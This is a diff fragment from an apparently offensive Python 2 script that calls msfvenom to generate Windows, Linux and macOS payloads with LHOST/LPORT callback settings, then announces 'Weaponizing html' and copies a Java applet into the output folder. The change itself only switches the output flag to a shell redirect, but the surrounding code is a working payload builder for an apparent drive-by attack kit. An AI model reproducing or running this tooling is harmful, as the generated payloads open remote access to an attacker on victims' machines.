@@ -80,11 +80,11 @@ if __name__ == '__main__':
       osx = arg
 
   print 'Generating Windows payload...'
-  os.system('msfvenom -p {payload} -f exe -o {output} LHOST={ip} LPORT={port}'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
+  os.system('msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
   print 'Generating Linux payload...'
-  os.system('msfvenom -p {payload} -f elf -o {output} LHOST={ip} LPORT={port}'.format(payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
+  os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
   print 'Generating Mac OS X payload...'
-  os.system('msfvenom -p {payload} -f elf -o {output} LHOST={ip} LPORT={port}'.format(payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
+  os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
 
   print 'Weaponizing html...'
   shutil.copy('applet.jar', 'output')
